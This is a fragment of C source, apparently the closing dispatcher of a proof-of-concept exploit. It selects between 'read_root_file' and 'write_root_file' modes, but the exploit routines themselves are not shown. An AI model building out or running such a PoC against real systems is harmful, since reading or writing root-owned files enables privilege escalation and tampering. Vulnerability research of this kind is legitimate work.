	poc_log("Mode: %s", args.mode);

	int ret = -1;
	if (strcmp(args.mode, POC_MODE_READ) == 0) {
		ret = mode_read_root_file(&args);
	} else if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
		ret = mode_write_root_file(&args);
	} else {
		poc_print_unsupported(args.mode,
		    "This PoC supports write_root_file and read_root_file modes");
		printf("%s\n", POC_RESULT_ERROR);
		ret = 2;
	}

	poc_log_close();
	return ret;
}
